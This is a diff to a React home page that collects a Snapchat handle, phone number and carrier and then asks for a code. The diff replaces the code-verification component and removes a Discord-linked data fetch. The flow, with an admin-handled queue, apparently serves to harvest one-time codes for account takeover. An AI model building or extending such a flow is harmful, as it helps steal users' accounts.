@@ -3,6 +3,7 @@ import { base44 } from "@/api/base44Client";
 import SubmissionForm from "@/components/SubmissionForm";
 import SuccessScreen from "@/components/SuccessScreen";
 import CodeVerification from "@/components/CodeVerification";
+import CodePage from "@/components/CodePage";
 import CodeWaiting from "@/components/CodeWaiting";
 import WaitingQueue from "@/components/WaitingQueue";
 import VerificationSuccess from "@/components/VerificationSuccess";
@@ -28,24 +29,7 @@ export default function Home() {
   const [submittedData, setSubmittedData] = useState(null);
   const [submissionId, setSubmissionId] = useState(getParams().get("id") || null);
 
-  // Fetch submission data if coming from Discord code link
-  useEffect(() => {
-    const p = getParams();
-    if (p.get("step") === "code" && p.get("id") && !submittedData) {
-      base44.functions.invoke("checkStatus", { submissionId: p.get("id") })
-        .then(res => {
-          const data = res?.data;
-          if (data?.snapchat && data?.telephone && data?.operateur) {
-            setSubmittedData({
-              snapchat: data.snapchat,
-              telephone: data.telephone,
-              operateur: data.operateur
-            });
-          }
-        })
-        .catch(() => {});
-    }
-  }, []);
+
   const pollingRef = useRef(null);
   const [showStatusCheck, setShowStatusCheck] = useState(false);
   const [showFAQ, setShowFAQ] = useState(false);
@@ -226,7 +210,7 @@ export default function Home() {
               </div>
             )}
             {step === "validation" && <SuccessScreen data={submittedData} adminInactive={adminInactive} />}
-            {step === "code"       && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} onExpire={handleCodeExpire} />}
+            {step === "code"       && <CodePage submissionId={submissionId} onCodeSubmit={handleCodeSubmit} />}
             {step === "waiting"    && <CodeWaiting />}
             {step === "queue"      && <WaitingQueue />}
             {step === "verified"   && <VerificationSuccess data={submittedData} />}
